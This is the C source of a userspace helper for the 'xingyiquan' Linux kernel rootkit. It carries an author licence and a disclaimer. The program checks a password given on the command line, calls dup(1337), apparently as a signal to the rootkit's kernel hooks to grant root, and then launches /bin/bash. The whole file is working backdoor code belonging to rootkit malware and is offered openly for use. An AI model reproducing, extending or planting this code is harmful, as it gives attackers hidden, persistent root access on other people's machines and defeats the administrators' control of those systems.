/*
 * userspace root shell for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * Ringlayer Public License Statement V.1
 * 1. This software is free software under copyright of Ringlayer's Public License
 * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) if you don't modify source code logic at least 50%
 * 3. You are not allowed to sell this source code without permission from author
 * 4. Violation of any terms above means author have some rights for law processing and right to fine 
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "xingyi_userspace_functions.h"
#include "xingyi_userspace_config.h"

int main(int argc, char *argv[])
{
	char *input;

	input = n_malloc(17);
	snprintf(input, 16, "%s", argv[1]);	
	if (strcmp(input, rootshell_password) == 0) {
		dup(1337);
		system("/bin/bash");
	}	
	else
		printf("\n[-] wrong password !\n");

	return 0;
}
